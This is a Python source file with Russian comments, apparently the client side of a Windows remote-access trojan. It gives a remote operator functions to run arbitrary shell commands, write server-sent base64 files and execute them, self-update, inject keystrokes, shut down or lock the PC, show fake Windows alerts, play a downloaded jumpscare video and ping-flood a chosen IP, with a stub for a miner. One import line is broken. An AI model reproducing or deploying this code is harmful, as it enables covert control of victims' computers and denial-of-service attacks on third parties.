import os
import config
import wget
import pyautogui
import ctypes
import subprocess
import base64
import webbrowser
import threading
import win32com.client as comclt
import keyboard
from sound_control.sound import Sound
import import ctypes


__test = config.test()


def screamer():
    """запускает видео скримера со свинкой пеппой"""
    try:
        if not os.path.exists("peppa.mp4"):
            wget.download("https://drive.google.com/uc?export=download&confirm=no_antivirus&id=1URMndAIpUpJ6f_USF4Ln6VOmQ64SVFCm")
    except Exception as err:
        print(err)
        return "Сайт загрузки скримера недоступен"
    try:
        os.system("peppa.mp4")
    except Exception as err:
        print(err)
        return "невозможно открыть файл скримера"
    return "Скример сработал"

def open_url(url):
    """Открывает ссылку в браузере"""
    try:
        webbrowser.open(url)
        return "ссылка открыта"
    except Exception as err:
        return f"при открытии ссылки произошла ошибка: {err}"

def wget_url(url):
    """Загружает файл по прямой ссылке"""
    try:
        wget.download(url)
        res = "успешное скачивание"
    except Exception as err:
        res = f"ошибка скачивания {err}"
    return res

def hotkey(keys):
    """активирует хоткей"""
    try:
        pyautogui.hotkey(keys)
        return "хоткей сработал"
    except Exception as err:
        print(err)
        return "неправильный хоткей"

def sys_command(command):
    """Использует стандартную системную комманду, например peppa.mp4 откроется в видеопроигрователе"""
    # переводит массив слов в строку с коммандой
    try:
        command = ' '.join(command)
    except Exception as err:
        print(err)
        return "Ошибка перевода комманды в клиенте"
    try:
        os.system(command)
        return "команда сработала"
    except Exception as err:
        print(err)
        return "Неправильная комманда"

def restart_pc():
    """перезагружает пк"""
    os.system("shutdown /r /t 1")
    return "пк клиента перезапущен"

def shutdown_pc():
    """выключает пк"""
    os.system("shutdown /s /t 1")
    return "пк клиента выключен"

def lock_pc():
    """выходит из пользователя ОС"""
    ctypes.windll.user32.LockWorkStation()
    return "пк клиента заблокирован"

def message(text):
    """выводит сообщение"""
    try:
        threading.Thread(target=ctypes.windll.user32.MessageBoxA, daemon=True, args=(None, text, "Windows attantion", 0)).start()
    except Exception as err:
        print(err)
        return "при вызове сообщения произошла ошибка"

def drop(name, content):
    """создает файл загруженный из сервера и открывает его"""
    try:
        if not os.path.exists(name):
            with open(name, "wb") as file:
                    file.write(base64.b64decode(content))
    except Exception as err:
        print(err)
        return "ошибка записи файла при отправке"
    try:
        os.system(name)
    except Exception as err:
        print(err)
        return "ошибка при открытии файла"
    return "файл открыт"

def restart_client():
    """перезапускает клиент"""
    subprocess.Popen(['python', 'client.py']) if __test == True else os.system('client.exe')
    return "скрипт клиента перезапущен"

def update_client(name, content):
    with open(name, "wb") as file:
        file.write(base64.b64decode(content))
    os.system(name)
    return "скрипт клиента перезапущен"

def press_key(words):
    wsh = comclt.Dispatch("WScript.Shell")
    for i in range(len(words) - 1):
        words[i] = words[i] + " "
    ret = "напечатано: \n"
    for word in words:
        for letter in word:
            ret = ret + letter
            wsh.SendKeys("{" + letter + "}")
    return ret

def start_miner(cpu_proc=50):
    pass

def ddos_ip(params):
    ip = params[0]
    time = params[1] if len(params) > 1 else 4
    pack_size = params[2] if len(params) > 2 else 32
    threads = int(params[3]) if len(params) > 3 else 10
    print(["ping", "-n", int(time), "-l", int(pack_size), ip])
    thread_list = []
    for i in range(threads - 1):
        thread_list.append(threading.Thread(target=subprocess.run, args=[["ping", "-n", str(time), "-l", str(pack_size), ip]], kwargs={"stdout": subprocess.PIPE, "encoding": 'cp866'}))
        try:
            thread_list[-1].start()
            print(f"thread {i}")
        except Exception as err:
            print(err)
            return str(err)
    ping = subprocess.run(["ping", "-n", str(time), "-l", str(pack_size), ip], stdout=subprocess.PIPE, encoding='cp866')
    print(ping.stdout)
    return "ддос запущен"

def set_wallpapers(name, content):
    try:
        if not os.path.exists(name):
            with open(name, "wb") as file:
                    file.write(base64.b64decode(content))
    except Exception as err:
        print(err)
        return "ошибка записи файла при отправке"
    ctypes.windll.user32.SystemParametersInfoW(20, 0, name , 0)
    

def volume_mute():
    """
    Mute or un-mute the system sounds
    Done by triggering a fake VK_VOLUME_MUTE key event
    :return: void
    """
    Sound.mute()

def volume_down(i):
    for _ in range(i):
        Sound.volume_down()

def volume_up(i):
    for _ in range(i):
        Sound.volume_up()

def volume_set(i):
    Sound.volume_set(i)